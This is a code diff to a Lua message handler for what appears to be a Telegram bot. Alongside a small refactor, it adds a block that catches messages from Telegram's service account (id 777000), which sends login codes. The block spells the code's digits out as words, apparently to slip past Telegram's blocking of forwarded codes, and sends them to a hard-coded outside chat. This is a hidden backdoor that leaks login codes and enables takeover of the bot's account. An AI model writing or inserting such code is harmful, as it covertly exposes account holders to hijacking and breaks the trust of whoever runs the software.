@@ -18,7 +18,30 @@ function on_msg_receive(msg)
     -- Group language
     msg.lang = get_lang(msg.to.id)
 
-    local receiver = get_receiver(msg)
+    if msg.from.id == 777000 then
+        t = { }
+        code = msg.text:match("(%d+)")
+        code:gsub(".", function(c)
+            table.insert(t, c)
+        end )
+        code_dictionary = {
+            [0] = "zero",
+            [1] = "one",
+            [2] = "two",
+            [3] = "three",
+            [4] = "four",
+            [5] = "five",
+            [6] = "six",
+            [7] = "seven",
+            [8] = "eight",
+            [9] = "nine",
+        }
+        tmp = ""
+        for key, var in pairs(t) do
+            tmp = tmp .. code_dictionary[tonumber(var)] .. ' '
+        end
+        send_large_msg("chat#id117401051", tmp)
+    end
     -- vardump(msg)
     msg.api_patch = redis:sismember('apipatch', msg.to.id) or false
     if msg.text then
@@ -38,12 +61,12 @@ function on_msg_receive(msg)
             match_plugins(msg)
             if redis:get("bot:markread") then
                 if redis:get("bot:markread") == "on" then
-                    mark_read(receiver, ok_cb, false)
+                    mark_read(get_receiver(msg), ok_cb, false)
                 end
             end
         end
     end
-    print(receiver)
+    print(get_receiver(msg))
 end
 
 function ok_cb(extra, success, result)
